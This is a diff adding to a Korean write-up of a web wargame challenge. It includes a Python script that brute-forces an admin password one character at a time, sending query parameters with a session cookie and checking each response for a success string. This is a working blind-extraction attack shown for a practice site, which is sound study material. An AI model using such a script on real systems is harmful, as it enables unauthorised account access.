@@ -65,3 +65,25 @@ pw= crackus , pw는 홈페이지명인 crackus이다.
 <img width="723" alt="스크린샷 2020-01-11 오후 2 28 44" src="https://user-images.githubusercontent.com/54495632/72199398-c131a000-347e-11ea-9507-d8aac80db84d.png">
 
 첫 번째 $result1에서 TRUE 만 성립하면 가능해서 어떤 것이 와도 관계는 없다.
+
+<img width="307" alt="스크린샷 2020-01-11 오후 4 35 18" src="https://user-images.githubusercontent.com/54495632/72200751-994b3800-3490-11ea-93b8-c81040550164.png">
+
+length 를 찾은 뒤
+
+import requests
+pw=''
+url ="http://crackus.jeju.kr/chall10.php?"
+cookies={'PHPSESSID':'쿠키값필요'}
+
+for i in range(0, 8):
+  for j in range(97,128):
+       query = "idx="+str(i)+"&ch="+chr(j)
+       geturl=url+query
+       req = requests.get(geturl,cookies=cookies)
+       if((req.text).find("Olleh ~ Admin")>0):
+          pw+=chr(j)
+          print(pw)
+          break
+print("Password is "+pw)
+
+다음과 같은 파이썬 코드로 해결 가능하다.
